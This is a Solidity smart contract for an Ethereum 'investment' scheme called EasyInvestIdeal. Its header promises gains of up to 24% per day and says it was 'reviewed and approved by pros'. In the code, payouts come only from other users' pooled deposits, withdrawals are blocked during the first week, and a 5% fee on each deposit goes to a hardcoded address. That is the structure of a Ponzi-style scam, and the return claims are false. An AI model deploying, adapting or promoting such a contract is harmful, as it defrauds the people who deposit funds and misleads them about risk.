1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * Easy Investment Ideal Contract
6  *  - GAIN UP TO 24% PER 24 HOURS (every 5900 blocks)
7  *
8  * How to use:
9  *  1. Send any amount of Ether to make an investment
10  *  2a. Claim your profit by sending 0 Ether transaction (every day, every
11  *      week, I don't care unless you're spending too much on GAS)
12  *  OR
13  *  2b. Send more Ether to reinvest AND get your profit at the same time
14  * 
15  * Rules:
16  *  1. You cannot withdraw more than 90% of fund
17  *  2. Funds from the fund cannot be withdrawn within a week after the
18  *     launch of the contract
19  *  3. Those who join the project with a deposit of at least 0.1 Etner
20  *     during the first week after launch become premium users and
21  *     receive a percentage of one and a half times more
22  *     (maximum - 24% instead of 16%)
23  *  4. If you invest or reinvest not less than 1 Ether, your percentage
24  *     immediately rises to the maximum
25  *  5. With each reinvestment of less than 1 Ether (or just when
26  *     withdrawing funds), the percentage decreases by 1%
27  *  6. Minimum percentage - 2%
28  *
29  * RECOMMENDED GAS LIMIT: 200000
30  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
31  * 
32  * Fee for advertising expenses - 5%
33  *
34  * Contract reviewed and approved by pros!
35  *
36  */
37 contract EasyInvestIdeal {
38     // records the block number in which the contract was created
39     uint public createdAtBlock;
40     // records funds in the fund
41     uint public raised;
42     
43     // records amounts invested
44     mapping (address => uint) public invested;
45     // records blocks at which investments were made
46     mapping (address => uint) public atBlock;
47     // records individual percentages
48     mapping (address => uint) public percentages;
49     // records premium users
50     mapping (address => bool) public premium;
51 
52     constructor () public {
53         createdAtBlock = block.number;
54     }
55     
56     function isFirstWeek() internal view returns (bool) {
57         return block.number < createdAtBlock + 5900 * 7;
58     }
59 
60     // this function called every time anyone sends a transaction to this contract
61     function () external payable {
62         // if sender (aka YOU) is invested more than 0 ether
63         if (!isFirstWeek() && invested[msg.sender] != 0) {
64             // calculate profit amount as such:
65             // amount = (amount invested) * (individual percentage) * (blocks since last transaction) / 5900
66             // 5900 is an average block count per day produced by Ethereum blockchain
67             uint amount = invested[msg.sender] * percentages[msg.sender] / 100 * (block.number - atBlock[msg.sender]) / 5900;
68 
69             if (premium[msg.sender]) {
70                 amount = amount * 3 / 2;
71             }
72             uint max = raised * 9 / 10;
73             if (amount > max) {
74                 amount = max;
75             }
76 
77             // send calculated amount of ether directly to sender (aka YOU)
78             msg.sender.transfer(amount);
79             raised -= amount;
80         }
81         
82         // set individual percentage
83         if (msg.value >= 1 ether) {
84             percentages[msg.sender] = 16;
85         } else if (percentages[msg.sender] > 2) {
86             if (!isFirstWeek()) {
87                 percentages[msg.sender]--;
88             }
89         } else {
90             percentages[msg.sender] = 2;
91         }
92 
93         // record block number and invested amount (msg.value) of this transaction
94         if (!isFirstWeek() || atBlock[msg.sender] == 0) {
95             atBlock[msg.sender] = block.number;
96         }
97         invested[msg.sender] += msg.value;
98         
99         if (msg.value > 0) {
100             // set premium user
101             if (isFirstWeek() && msg.value >= 100 finney) {
102                 premium[msg.sender] = true;
103             }
104             // calculate fee (5%)
105             uint fee = msg.value / 20;
106             address(0x107C80190872022f39593D6BCe069687C78C7A7C).transfer(fee);
107             raised += msg.value - fee;
108         }
109     }
110 }